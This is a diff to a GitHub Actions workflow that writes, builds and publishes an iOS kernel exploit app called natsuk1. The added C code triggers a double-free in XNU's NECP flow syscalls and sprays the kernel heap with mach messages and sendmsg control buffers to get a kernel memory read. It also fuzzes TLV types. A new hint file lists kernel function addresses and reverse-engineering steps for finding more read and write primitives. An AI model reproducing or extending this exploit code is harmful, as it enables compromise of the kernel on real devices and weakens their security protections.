@@ -115,6 +115,8 @@ jobs:
           #include <unistd.h>
           #include <errno.h>
           #include <sys/syscall.h>
+          #include <sys/socket.h>
+          #include <sys/uio.h>
           #include <mach/mach.h>
           #include <mach/message.h>
 
@@ -141,11 +143,12 @@ jobs:
 
           #define NCF_ASN 0x20
           #define RESBUF 8192
-          #define SPRAY_PORTS 24
-          #define SPRAY_PER_PORT 6
+          #define SPRAY_PORTS 32
+          #define SPRAY_PER_PORT 8
+          #define SPRAY_CMSG 24
 
-          static const int MSG_SIZES[] = { 768, 960, 1216 };
-          #define MSG_SIZES_COUNT 3
+          static const int MSG_SIZES[] = { 512, 640, 768, 896 };
+          #define MSG_SIZES_COUNT 4
 
           static volatile int g_busy = 0;
           static volatile int g_cancel = 0;
@@ -222,7 +225,7 @@ jobs:
               }
           }
 
-          static int spray_send_inline(spray_t *sp, int msgsz, uint64_t target_kaddr) {
+          static int spray_msg(spray_t *sp, int msgsz, const uint8_t *payload, size_t paylen) {
               int sent = 0;
               if (msgsz < 64) return 0;
               uint8_t *mbuf = malloc((size_t)msgsz);
@@ -231,20 +234,50 @@ jobs:
                   if (g_cancel) break;
                   for (int j = 0; j < SPRAY_PER_PORT; j++) {
                       memset(mbuf, 0x42, (size_t)msgsz);
+                      size_t pc = paylen < (size_t)(msgsz - 24) ? paylen : (size_t)(msgsz - 24);
+                      if (pc > 0) memcpy(mbuf + 24, payload, pc);
                       mach_msg_header_t *h = (mach_msg_header_t*)mbuf;
                       h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
                       h->msgh_size = (mach_msg_size_t)msgsz;
                       h->msgh_remote_port = sp->ports[i];
                       h->msgh_id = 0x7000 + sent;
-                      if ((size_t)NCF_ASN + 8 <= (size_t)msgsz) {
-                          *(uint64_t*)(mbuf + NCF_ASN) = target_kaddr;
-                      }
                       mach_msg_return_t kr = mach_msg(h, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                                        h->msgh_size, 0, MACH_PORT_NULL, 30, MACH_PORT_NULL);
                       if (kr == MACH_MSG_SUCCESS) sent++;
                   }
               }
               free(mbuf);
+              return sent;
+          }
+
+          /* sendmsg with msg_control allocates cmsg buffer in kernel kalloc */
+          static int spray_cmsg(uint64_t target) {
+              int sent = 0;
+              uint8_t ctrl[1024];
+              for (int k = 0; k < SPRAY_CMSG; k++) {
+                  int s[2];
+                  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, s) != 0) break;
+                  size_t ctrl_len = 512 + (k * 8);
+                  if (ctrl_len > sizeof(ctrl)) ctrl_len = sizeof(ctrl);
+                  memset(ctrl, 0x43, ctrl_len);
+                  if (ctrl_len >= NCF_ASN + 8) {
+                      *(uint64_t*)(ctrl + NCF_ASN) = target;
+                  }
+                  struct msghdr mh;
+                  struct iovec iov;
+                  memset(&mh, 0, sizeof(mh));
+                  memset(&iov, 0, sizeof(iov));
+                  char dummy = 'X';
+                  iov.iov_base = &dummy;
+                  iov.iov_len = 1;
+                  mh.msg_iov = &iov;
+                  mh.msg_iovlen = 1;
+                  mh.msg_control = ctrl;
+                  mh.msg_controllen = ctrl_len;
+                  if (sendmsg(s[0], &mh, 0) == 1) sent++;
+                  /* keep s[1] open in a global to hold the buffer */
+                  (void)s[1];
+              }
               return sent;
           }
 
@@ -262,26 +295,48 @@ jobs:
               sp->n = 0;
           }
 
-          static int try_read_one(uint64_t target, int msgsz, uint8_t *out, int outsz, int *out_ret) {
+          /* --------------------------------------------------------------
+           * Correct double-free exploitation order:
+           *
+           *   1. add_flow              -> alloc S, flow_list -> S
+           *   2. remove_flow           -> free S (freelist = [S])
+           *   3. remove_flow again     -> free S again (freelist = [S, S])
+           *   4. add_flow              -> returns S (freelist = [S])
+           *   5. spray                 -> returns S again (freelist = [])
+           *                              spray data overwrites S
+           *   6. copy_result           -> reads S + NCF_ASN = spray[offset]
+           *
+           * spray must come AFTER the second add_flow.
+           * -------------------------------------------------------------- */
+
+          static int try_read_df(uint64_t target, int msgsz, uint8_t *out, int outsz, int *out_ret) {
               int fd = nfd();
               if (fd < 0) return -1;
-              uint8_t cu[16], fu[16];
+              uint8_t cu[16], fu1[16], fu2[16];
               if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
+              if (nadd_flow(fd, cu, fu1) != 0) { close(fd); return -1; }
 
-              int r1 = nrm_flow(fd, fu);
-              if (r1 != 0) { close(fd); return -1; }
+              int r1 = nrm_flow(fd, fu1);
+              int r2 = nrm_flow(fd, fu1);
+              LI("DF", "free#1=%d free#2=%d", r1, r2);
+
+              int r3 = nadd_flow(fd, cu, fu2);
+              LI("DF", "re-add=%d", r3);
 
               spray_t sp;
               spray_init(&sp, SPRAY_PORTS);
-              int sent = spray_send_inline(&sp, msgsz, target);
-
-              uint8_t f2[16];
-              int r2 = nadd_flow(fd, cu, f2);
+              uint8_t fake[2048];
+              memset(fake, 0x42, sizeof(fake));
+              if ((size_t)NCF_ASN + 8 <= sizeof(fake)) {
+                  *(uint64_t*)(fake + NCF_ASN) = target;
+              }
+              int sent = spray_msg(&sp, msgsz, fake, sizeof(fake));
+              LI("DF", "spray=%d", sent);
 
               uint8_t buf[RESBUF];
               memset(buf, 0, sizeof(buf));
               int c = ncpy(fd, cu, buf, sizeof(buf));
+              LI("DF", "copy=%d", c);
 
               if (out_ret) *out_ret = c;
               if (out && outsz > 0 && c > 0) {
@@ -291,14 +346,69 @@ jobs:
 
               spray_drain(&sp);
               close(fd);
-              (void)r2;
-              (void)sent;
               return c;
+          }
+
+          static void try_cmsg(uint64_t target) {
+              LI("CMSG", "spray msg_control");
+              int fd = nfd();
+              if (fd < 0) { LE("CMSG", "open errno=%d", errno); return; }
+              uint8_t cu[16], fu1[16], fu2[16];
+              if (nadd_client(fd, cu) != 0 || nadd_flow(fd, cu, fu1) != 0) {
+                  LE("CMSG", "setup errno=%d", errno); close(fd); return;
+              }
+              int r1 = nrm_flow(fd, fu1);
+              int r2 = nrm_flow(fd, fu1);
+              LI("CMSG", "free#1=%d free#2=%d", r1, r2);
+              int r3 = nadd_flow(fd, cu, fu2);
+              LI("CMSG", "re-add=%d", r3);
+
+              int sent = spray_cmsg(target);
+              LI("CMSG", "sprayed=%d", sent);
+
+              uint8_t buf[RESBUF];
+              memset(buf, 0, sizeof(buf));
+              int c = ncpy(fd, cu, buf, sizeof(buf));
+              LI("CMSG", "copy=%d", c);
+              if (c > 0) {
+                  int has_43 = 0;
+                  int has_k = 0;
+                  for (int k = 0; k + 8 <= c; k++) {
+                      uint64_t v;
+                      memcpy(&v, buf + k, 8);
+                      if (is_kptr(v)) { has_k = 1; break; }
+                      if (v == 0x4343434343434343ULL) { has_43 = 1; }
+                  }
+                  LI("CMSG", "kptr=%d marker_43=%d", has_k, has_43);
+              }
+              close(fd);
+          }
+
+          static void probe_tlv_types(void) {
+              LI("TLV", "type sweep");
+              int fd = nfd();
+              if (fd < 0) return;
+              uint8_t cu[16], fu[16];
+              if (nadd_client(fd, cu) != 0) { close(fd); return; }
+              for (int t = 0; t < 0x10; t++) {
+                  uint8_t req[128];
+                  memset(req, 0x55, sizeof(req));
+                  memcpy(req + 0x10, cu, 16);
+                  *(uint16_t*)(req + 0x20) = 0x0040;
+                  *(uint16_t*)(req + 0x28) = (uint16_t)t;
+                  *(uint16_t*)(req + 0x2a) = 0x60;
+                  errno = 0;
+                  int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
+                                       (void*)cu, (size_t)16, req, (size_t)sizeof(req));
+                  LI("TLV", "t=0x%02x ret=%d errno=%d", t, r, errno);
+                  usleep(5000);
+              }
+              close(fd);
           }
 
           static int impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v2.9 (natsuk1-kread-v19) ===");
+              nk_log("=== natsuk1 v3.0 (natsuk1-df-v20) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("");
               LI("INIT", "NCF_ASN=0x%x PORTS=%d PER=%d SIZES=%d",
@@ -314,13 +424,16 @@ jobs:
               uint64_t target = kbase + OFF_KERNPROC;
               LI("P3", "target=0x%llx", (unsigned long long)target);
 
+              probe_tlv_types();
+              if (g_cancel) { LW("CANCEL", "at tlv"); return 2; }
+
               int any_hit = 0;
               for (int i = 0; i < MSG_SIZES_COUNT; i++) {
                   if (g_cancel) { LW("CANCEL", "at size %d", i); return 2; }
                   int msgsz = MSG_SIZES[i];
                   uint8_t buf[RESBUF];
                   int r = 0;
-                  int c = try_read_one(target, msgsz, buf, sizeof(buf), &r);
+                  int c = try_read_df(target, msgsz, buf, sizeof(buf), &r);
                   LI("TRY", "msgsz=%d ret=%d", msgsz, r);
                   if (r > 0) {
                       int has_k = 0;
@@ -333,29 +446,33 @@ jobs:
                       }
                       if (has_k) {
                           any_hit = 1;
-                          LO("HIT", "msgsz=%d kptr found", msgsz);
+                          LO("HIT", "msgsz=%d kptr", msgsz);
                           for (int k = 0; k + 8 <= r; k++) {
                               uint64_t v;
                               memcpy(&v, buf + k, 8);
-                              if (is_kptr(v)) {
-                                  LO("HIT", "  +0x%x = 0x%llx", k, (unsigned long long)v);
-                              }
+                              if (is_kptr(v)) LO("HIT", "  +0x%x = 0x%llx", k, (unsigned long long)v);
                           }
                       } else if (has_42) {
-                          LI("TRY", "msgsz=%d marker present", msgsz);
+                          LI("TRY", "msgsz=%d marker 0x42", msgsz);
+                          any_hit = 1;
                       } else {
                           LI("TRY", "msgsz=%d no kptr", msgsz);
                       }
                   }
                   (void)c;
-                  usleep(25000);
+                  usleep(20000);
               }
 
               if (!any_hit) {
-                  LW("DONE", "no kptr — NECP-kread dead on this build");
-                  LW("DONE", "flow->assigned_results not reachable via copy_result");
+                  LW("DF", "no kptr with mach_msg spray, trying cmsg");
+                  try_cmsg(target);
+              }
+
+              if (!any_hit) {
+                  LW("DONE", "no kread primitive found");
+                  LW("DONE", "see NEXTHINT.txt for Ghidra steps");
               } else {
-                  LO("DONE", "kread working");
+                  LO("DONE", "kread candidate working");
               }
               return any_hit ? 0 : 1;
           }
@@ -376,6 +493,52 @@ jobs:
               nk_log("[!] cancel requested");
           }
           NECP
+
+      - name: Write NEXTHINT.txt
+        run: |
+          cat > NEXTHINT.txt <<'TXT'
+          Ghidra analysis needed for necp_client_copy_result
+
+          1. necp_client_copy_result (verified 0xFFFFFFF00A4EAC7C + slide)
+             - Open in Ghidra, decompile.
+             - Confirm it iterates client->flow_list.
+             - Locate the flow pointer (register x21 in our dump).
+             - Find every `ldr xN, [x21, #off]` that leads to `memcpy` or `copyout`.
+             - CRITICAL: check whether the second `add_flow` after double-free
+               causes the flow struct to be reinitialized. If yes, look for
+               any code path in copy_result that reads from flow BEFORE the
+               reinit step in add_flow.
+
+          2. necp_client_add_flow (0xFFFFFFF00A4E843C)
+             - Find where the flow struct is allocated (kalloc size).
+             - Find where `assigned_results` and `assigned_results_length`
+               are written into the flow struct.
+             - If those fields are 0 and never set by user, the copy_result
+               kread path is dead.
+
+          3. necp_client_remove_flow (0xFFFFFFF00A4E93C4)
+             - Find the refcount decrement.
+             - Confirm double-free is a real bug (we saw rm1=0 rm2=0).
+
+          4. TLV parser (necp_get_tlv_at_offset or similar)
+             - Search symbol table for "tlv".
+             - Look for functions taking (buf, len, type, &out, &out_len).
+             - Check for uint32 overflow in length arithmetic.
+             - If found -> potential OOB read of 4GB.
+
+          5. Other write primitives
+             - Search for `copyout` calls with user-controlled length in the
+               NECP syscall handlers.
+             - Look for `necp_set_tlv_at_offset`.
+             - Look for TLV type handling that copies user data to a
+               user-controlled offset in the flow struct.
+
+          6. Alternative: socket / pipe
+             - `struct socket` allocation path: soalloc -> zone or kalloc?
+             - If kalloc, we can spray via socket(AF_INET, SOCK_STREAM).
+             - `sendmsg` with msg_control -> kalloc buffer.
+             - Check `kalloc.1024` callers in the source if available.
+          TXT
 
       - name: Write OverviewView.swift
         run: |
@@ -405,7 +568,7 @@ jobs:
                               }
                               .disabled(!state.running)
                           } header: {
-                              Text("Exploit")
+                              Label("Exploit", systemImage: "bolt.shield")
                           }
 
                           RuntimeView()
@@ -414,7 +577,7 @@ jobs:
                           Section {
                               LogTerminal(text: state.log.isEmpty ? "Awaiting execution." : state.log)
                           } header: {
-                              Text(state.t("Logs", "Логи"))
+                              Label(state.t("Logs", "Логи"), systemImage: "terminal")
                           }
 
                           Section {
@@ -436,7 +599,7 @@ jobs:
                               }
                               .disabled(state.log.isEmpty)
                           } header: {
-                              Text("Log Actions")
+                              Label("Log Actions", systemImage: "doc.on.clipboard")
                           }
                       }
                       .listStyle(.insetGrouped)
@@ -516,7 +679,7 @@ jobs:
                           StatusDot(status: state.status)
                       }
                   } header: {
-                      Text("Runtime")
+                      Label("Runtime", systemImage: "waveform.path.ecg")
                   }
               }
           }
@@ -612,7 +775,7 @@ jobs:
                               .foregroundStyle(.secondary)
                       }
                   } header: {
-                      Text("Network")
+                      Label("Network", systemImage: "network")
                   }
               }
 
@@ -652,7 +815,7 @@ jobs:
                                       in: RoundedRectangle(cornerRadius: 12))
                       }
                   } header: {
-                      Text("Pairing")
+                      Label("Pairing", systemImage: "link.circle")
                   }
 
                   Section {
@@ -709,7 +872,7 @@ jobs:
                               .textInputAutocapitalization(.never)
                       }
                   } header: {
-                      Text("Pairing")
+                      Label("Pairing", systemImage: "link.circle")
                   }
 
                   Section {
@@ -727,7 +890,7 @@ jobs:
                           Text("Respring").frame(maxWidth: .infinity, alignment: .leading)
                       }
                   } header: {
-                      Text("Exploit")
+                      Label("Exploit", systemImage: "bolt.shield")
                   }
 
                   Section {
@@ -751,7 +914,7 @@ jobs:
                                   ? "No output yet."
                                   : airlift.exploitLog.joined(separator: "\n"))
                   } header: {
-                      Text("Log")
+                      Label("Log", systemImage: "terminal")
                   }
               }
 
@@ -775,7 +938,7 @@ jobs:
                       }
                       .disabled(airlift.exploitLog.isEmpty)
                   } header: {
-                      Text("Log Actions")
+                      Label("Log Actions", systemImage: "doc.on.clipboard")
                   }
               }
           }
@@ -788,7 +951,6 @@ jobs:
           P = "natsuk1/natsuk1.swift"
           with open(P) as f: s = f.read()
           changed = False
-
           if "natsuk1-respring-v1" not in s:
               old = '.onChange(of: scenePhase) { _, phase in'
               if old not in s:
@@ -801,7 +963,6 @@ jobs:
               if "natsuk1-respring-v1" not in s:
                   print("FAIL: respring marker missing"); sys.exit(1)
               changed = True
-
           if "natsuk1-cancel-v1" not in s:
               old = '    func clear() { LockedBuffer.shared.clear(); log = "" }'
               if old not in s:
@@ -815,7 +976,6 @@ jobs:
               if "natsuk1-cancel-v1" not in s:
                   print("FAIL: cancel marker missing"); sys.exit(1)
               changed = True
-
           if changed:
               with open(P, "w") as f: f.write(s)
               print("natsuk1.swift patched")
@@ -847,111 +1007,9 @@ jobs:
           print("AirliftBridge.swift patched")
           PYEOF
 
-      - name: Write README.md
-        run: |
-          cat > README.md <<'MD'
-          <p align="right">
-            <img align="right" height="140" src="natsuk1.png?raw=true"/>
-          </p>
-
-          # natsuk1
-
-          iOS 27.0 kernel research toolkit.
-
-          ![platform](https://img.shields.io/badge/platform-iOS%2027.0-blue)
-          ![arch](https://img.shields.io/badge/arch-arm64e-green)
-          ![device](https://img.shields.io/badge/device-iPhone14%2C5%20%2F%2014%2C7-lightgrey)
-          ![license](https://img.shields.io/badge/license-MIT-yellow)
-
-          ## Overview
-
-          Kernel-level research project targeting XNU on arm64e.
-
-          - NECP UAF primitives with double-free confirmation
-          - Kernel offset database for iOS 27.0 / 24A437
-          - Remote pairing host (RPPairing) for sandbox-escape research
-          - Background keep-alive (silent audio + low-accuracy location)
-          - Crash-safe logging with recovery across sessions
-
-          ## Requirements
-
-          - iPhone with **iOS 27.0** (build 24A437)
-          - LocalDevVPN with interface `10.7.0.x`
-          - Sideload via AltStore / TrollStore / Sideloadly / Xcode
-
-          ## Install
-
-          Download the latest `natsuk1.ipa` from the [development release](../../releases/tag/development) and sideload it.
-
-          ## Build
-
-          ```
-          brew install xcodegen ldid
-          xcodegen generate
-          xcodebuild -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release -sdk iphoneos
-          ```
-
-          ## Structure
-
-          ```
-          natsuk1/
-          ├── Exploit/         C primitives (NECP, offsets)
-          ├── Helpers/         Swift bridges (pairing, MG, keep-alive)
-          ├── Offsets/         Versioned kernel offset DB
-          ├── Resources/       Info.plist, entitlements, assets
-          └── Views/           SwiftUI interface
-          ```
-
-          ## Notes
-
-          - All offsets are device/build specific. Verify before use.
-          - NECP-flow kernel read is under active research.
-          - This is a research project, not a general-purpose jailbreak.
-
-          ## Credits
-
-          - [@flong69zxc-max](https://github.com/flong69zxc-max)
-          - [@murk-sus](https://github.com/murk-sus)
-          - [@eurogoth](https://t.me/eurogoth)
-          - [@asuka4scape](https://t.me/asuka4scape_developer)
-
-          ## License
-
-          MIT — see [LICENSE](LICENSE).
-          MD
-
-      - name: Write .gitignore
-        run: |
-          cat > .gitignore <<'GIT'
-          # Xcode
-          natsuk1.xcodeproj/
-          build/
-          DerivedData/
-          xcuserdata/
-          *.xcuserstate
-
-          # Build artifacts
-          *.ipa
-          *.tar.gz
-          Payload/
-          natsuk1-app.tar.gz
-          natsuk1.ipa
-
-          # IDE / OS
-          .DS_Store
-          .vscode/
-          .idea/
-
-          # Local
-          reference/
-          *.log
-          GIT
-
       - name: Verify
         run: |
           F=natsuk1/Exploit/necp.c
-          H=natsuk1/Exploit/nk_api.h
-          C=natsuk1/Exploit/nk_api.c
           O=natsuk1/Views/OverviewView.swift
           R=natsuk1/Views/RuntimeView.swift
           A=natsuk1/Views/AirliftView.swift
@@ -961,41 +1019,32 @@ jobs:
           chk() {
             if eval "$2" >/dev/null 2>&1; then echo "  OK   $1"; else echo "  FAIL $1"; FAIL=1; fi
           }
-
           echo "--- necp.c ---"
-          chk "NCF_ASN 0x20"      "grep -q -e 'NCF_ASN 0x20' $F"
-          chk "marker v19"        "grep -q -e 'natsuk1-kread-v19' $F"
+          chk "marker v20"        "grep -q -e 'natsuk1-df-v20' $F"
+          chk "try_read_df"       "grep -q -e 'static int try_read_df' $F"
+          chk "spray_cmsg"        "grep -q -e 'static int spray_cmsg' $F"
+          chk "probe_tlv_types"   "grep -q -e 'static void probe_tlv_types' $F"
           chk "nk_necp_cancel"    "grep -q -e 'void nk_necp_cancel(void)' $F"
-          chk "g_cancel var"      "grep -q -e 'g_cancel' $F"
-
-          echo "--- nk_api.h ---"
-          chk "cancel decl"       "grep -q -e 'void nk_necp_cancel(void)' $H"
-
-          echo "--- nk_api.c ---"
-          chk "v8-api marker"     "grep -q -e 'natsuk1-v8-api' $C"
 
           echo "--- OverviewView ---"
+          chk "icon Exploit"      "grep -q -e 'Label(\"Exploit\", systemImage: \"bolt.shield\")' $O"
+          chk "icon Logs"         "grep -q -e 'Label(state.t(\"Logs\", \"Логи\"), systemImage: \"terminal\")' $O"
+          chk "icon Log Actions"  "grep -q -e 'Label(\"Log Actions\", systemImage: \"doc.on.clipboard\")' $O"
           chk "no icon Run"       "! grep -q -e 'Image(systemName: \"bolt.fill\")' $O"
           chk "no icon Cancel"    "! grep -q -e 'Image(systemName: \"xmark.circle\")' $O"
-          chk "Log Actions"       "grep -q -e 'Log Actions' $O"
-          chk "Copied! text"      "grep -q -e 'Copied!' $O"
-          chk "Cancel Exploit"    "grep -q -e 'Cancel Exploit' $O"
 
           echo "--- RuntimeView ---"
-          chk "no StatusDot import label" "grep -q -e 'StatusDot' $R"
-          chk "Slide row"         "grep -q -e 'Text(\"Slide\")' $R"
-          chk "Base row"          "grep -q -e 'Text(\"Base\")' $R"
+          chk "icon Runtime"      "grep -q -e 'Label(\"Runtime\", systemImage: \"waveform.path.ecg\")' $R"
 
           echo "--- AirliftView ---"
           chk "import Combine"    "grep -q -e '^import Combine' $A"
-          chk "ticker"            "grep -q -e 'Timer.publish' $A"
-          chk "async refresh"     "grep -q -e 'DispatchQueue.global' $A"
-          chk "Log Actions"       "grep -q -e 'Log Actions' $A"
+          chk "icon Network"      "grep -q -e 'Label(\"Network\", systemImage: \"network\")' $A"
+          chk "icon Pairing"      "grep -q -e 'Label(\"Pairing\", systemImage: \"link.circle\")' $A"
+          chk "icon Exploit"      "grep -q -e 'Label(\"Exploit\", systemImage: \"bolt.shield\")' $A"
+          chk "icon Log"          "grep -q -e 'Label(\"Log\", systemImage: \"terminal\")' $A"
+          chk "icon Log Actions"  "grep -q -e 'Label(\"Log Actions\", systemImage: \"doc.on.clipboard\")' $A"
           chk "no icon Run"       "! grep -q -e 'Image(systemName: \"bolt.fill\")' $A"
           chk "no icon Cancel"    "! grep -q -e 'Image(systemName: \"xmark.circle\")' $A"
-          chk "no icon Copy"      "! grep -q -e 'doc.on.doc' $A"
-          chk "Tunnel row"        "grep -q -e 'Text(\"Tunnel\")' $A"
-          chk "Device row"        "grep -q -e 'Text(\"Device\")' $A"
 
           echo "--- natsuk1.swift ---"
           chk "respring hook"     "grep -q -e 'natsuk1-respring-v1' $N"
@@ -1004,20 +1053,17 @@ jobs:
           echo "--- AirliftBridge.swift ---"
           chk "cancelExploit fn"  "grep -q -e 'func cancelExploit' $B"
 
-          echo "--- C syntax ---"
+          echo "--- NEXTHINT ---"
+          chk "NEXTHINT exists"   "test -f NEXTHINT.txt"
+          chk "NEXTHINT has ghidra" "grep -q -e 'necp_client_copy_result' NEXTHINT.txt"
+
+          echo "--- syntax ---"
           SDK=$(xcrun --sdk iphoneos --show-sdk-path)
           if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
               -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F" 2>&1; then
               echo "  OK   clang necp.c"
           else
               echo "  FAIL clang necp.c"
-              FAIL=1
-          fi
-          if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
-              -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$C" 2>&1; then
-              echo "  OK   clang nk_api.c"
-          else
-              echo "  FAIL clang nk_api.c"
               FAIL=1
           fi
 
@@ -1072,7 +1118,7 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "minimalist UI, log actions, cancel exploit"
+            --notes "icons on headers, correct double-free order, cmsg spray, TLV sweep, NEXTHINT"
 
       - name: Commit
         run: |
@@ -1088,8 +1134,7 @@ jobs:
             natsuk1/Views/AirliftView.swift \
             natsuk1/natsuk1.swift \
             natsuk1/Helpers/AirliftBridge.swift \
-            README.md \
-            .gitignore
+            NEXTHINT.txt
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "minimalist UI + log actions + cancel [skip ci]"
+          git commit -m "headers icons + correct double-free + cmsg spray [skip ci]"
           git push
